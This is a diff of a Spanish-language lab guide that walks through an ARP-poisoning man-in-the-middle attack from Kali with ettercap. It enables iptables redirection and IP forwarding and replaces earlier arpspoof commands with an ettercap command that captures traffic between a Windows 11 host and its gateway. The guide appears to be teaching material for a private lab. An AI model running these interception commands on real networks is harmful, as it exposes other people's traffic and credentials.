@@ -392,11 +392,19 @@ Debemos cambiar esos valores por ***0***, que representa a ***root***. El result
 
 ![Ettercap id usuario root](../img/lab-06-F/202209241058.png)
 
+Aún tenemos que hacer otro cambio, que consiste en configurar el firewall de Linux por medio de ***IP Tables***. En ***nano*** pulsar ***CTRL+W***, que habilitará la búsqueda. Escribimos lo siguientey pulsamos ***Enter***.
+Nota: Debemos buscar en la sección ***Linux***.
+```
+#redir_command_on
+```
 
+Debemos ***retirar*** el carácter de comentario ***#*** para que la línea sea leída por ***ettercap*** y configure el firewall. 
 
+![Ettercap quitar #](../img/lab-06-F/202209241115.png)
 
+Salimos de ***nano*** con ***CTRL+X***, ***Y*** y ***Enter***.
 
-Habilitamos el ***IP forwarding*** en ***Kali***, abrimos una terminal y escribimos.
+Seguimos en la máquina ***Kali***. También tenemos que habilitar el ***IP forwarding*** en ***Kali***, en la terminal escribimos.
 ```
 sudo sysctl -w net.ipv4.ip_forward=1
 ```
@@ -404,15 +412,10 @@ sudo sysctl -w net.ipv4.ip_forward=1
 sudo sysctl -p
 ```
 
-Envenenamos a la víctima. En la terminal escribimos.
+Hacemos el MitM con ***ettercap***. En la terminal escribimos.
+Nota: ***-T*** usamos interfaz de texto, no GUI. ***-i eth0*** tarjeta de red que enviará las tramas arp envenenadas. ***-M arp:remote*** queremos hacer un MitM. ***/192.168.20.1//  /192.168.20.11//*** se captura todo el tráfico entre Win11 y la puerta de enlace. ***> ssloutput.txt*** la captura se guarda en este archivo.
 ```
-sudo arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
-```
-
-Envenenamos a la puerta de enlace. En una nueva terminal, escribimos.
-```
-sudo arpspoof -i eth0 -t 192.168.20.1 192.168.20.11
+ettercap -T -i eth0 -M arp:remote /192.168.20.1// 192.168.20.11// > ssloutput.txt
 ```
 
-En este momento tenemos el ***MitM*** desplegado y todo el tráfico pasa por ***Kali***.
 
